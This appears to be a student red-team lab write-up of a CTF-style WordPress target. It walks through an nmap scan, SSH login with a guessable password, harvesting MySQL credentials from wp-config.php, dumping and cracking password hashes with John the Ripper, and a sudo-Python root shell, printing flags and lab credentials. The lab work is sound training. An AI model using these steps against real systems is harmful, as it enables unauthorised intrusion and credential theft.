#
# **Red Team: Summary of Operations**

## **Table of Contents**

- Exposed Services
- Critical Vulnerabilities
- Exploitation

### **Exposed Services**

Nmap scan results for each machine reveal the below services and OS details:

$ nmap ... # nmap -sV 192.168.1.110

![](RackMultipart20220513-1-igqb1a_html_9da9c34b1e4321f4.png)

This scan identifies the services in the above screenshot as potential points of entry.

**Critical Vulnerabilites**

The following vulnerabilities were identified on target 1.

- Network Mapping (WordPress site)
  - Nmap was used to discover open ports.
- SSH access available to public
  - An easily guessable user password was used to gain ssh access. No ssh key was required.
- MySQL login stored in plaintext
  - The attackers were able to discover a file containing login information for the MySQL database stored in plaintext.
- Unsalted hashes
  - The attackers were able to gain access to usernames and unsalted hashes of those users passwords in MySQL. The attacker exfiltrated the unsalted hashes and cracked them using John the Ripper.
- Privilege Escalation
  - User Steven has sudo access for Python
    - The attackers leveraged this vulnerability to gain root access.

Below are the associated CVE entries on identified vulnerabilities.

- Target 1
  - [CVE-2021-28041 open SSH](https://nvd.nist.gov/vuln/detail/CVE-2021-28041)
  - [CVE-2017-15710 Apache https 2.4.10](https://nvd.nist.gov/vuln/detail/CVE-2017-15710)
  - [CVE-2017-8779 exploit on open rpcbind port could lead to remote DoS](https://nvd.nist.gov/vuln/detail/CVE-2017-8779)
  - [CVE-2017-7494 Samba NetBIOS](https://nvd.nist.gov/vuln/detail/CVE-2017-7494)

-

### **Exploitation**

The Red Team was able to penetrate Target 1 and retrieve the following confidential data:

![](RackMultipart20220513-1-igqb1a_html_d4c733c59bd9ed1d.png)

![](RackMultipart20220513-1-igqb1a_html_c123c7da8965477f.png)

  - flag1.txt: flag1{b9bbcb33e11b80be759c4e844862482d}
    - **Exploit Used:** ssh into Michael&#39;s account and look in the/var/www files
      - ssh michael@192.168.1.110
      - Password: michael
      - command: $ cd /var/www
      - command: $ ls
      - command: $ grep -RE flag html
        - Screenshot below is the output of the &quot;grep&quot; command.

![](RackMultipart20220513-1-igqb1a_html_2283abc7f8e77542.png)

  - flag2.txt: flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
    - **Exploit Used**
      - ssh&#39;d into Michael&#39;s account and looked in the /var/www files.

![](RackMultipart20220513-1-igqb1a_html_568a92c76f798552.png)

Flag 3 and 4

flag3.txt: flag3{afc01ab56b50591e7dccf93122770cd2}

flag4.txt: flag4.txt: flag4{715dea6c055b9fe3337544932f2941ce}

Exploits used

- As Michael found MySQL login information in the /var/www/html/wordpress/wp-config.php file.

![](RackMultipart20220513-1-igqb1a_html_af58720d345cf4d7.png)

- Used the credentials u: root p: R@v3nSecurity to login to MySQL
  - Command: mysql -u root -p
  - Password: R@v3nSecurity
- Command: show databases;
- Command: use wordpress;
- Command: show tables;
- Command: select \* from wp\_posts;

Found flags 3 and 4.

![](RackMultipart20220513-1-igqb1a_html_27687e2d556f953c.png)

Found hashed passwords for Michael and Steven in MySQL

Command: $ select \* from wp\_users;

![](RackMultipart20220513-1-igqb1a_html_7a58fe1557b5de0.png)

**Escalating to Root**

- Exfiltrated Steven&#39;s hashed password and cracked it using John the Ripper
  - Copied hash into a local file called wp\_hashes.txt
    - Command: $ john wp\_hashes.txt
- ![](RackMultipart20220513-1-igqb1a_html_e5e39951a42611e7.png)
- Steven password is pink84
- Ssh steven@192.168.1.110
  - Passwd: pink84
- Command: $ sudo -l
- ![](RackMultipart20220513-1-igqb1a_html_4a869b00a454f0f8.png)
- Steven has sudo privileges to use Python. We can [exploit this](https://rcenetsec.com/shell-spawning/)
- sudo python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
- ![](RackMultipart20220513-1-igqb1a_html_ff148a0de0fc11fe.png)
- command: $ cd
- command: $ ls
- command: $ cat flag4.txt
- ![](RackMultipart20220513-1-igqb1a_html_663eb3d47f43bb9d.png)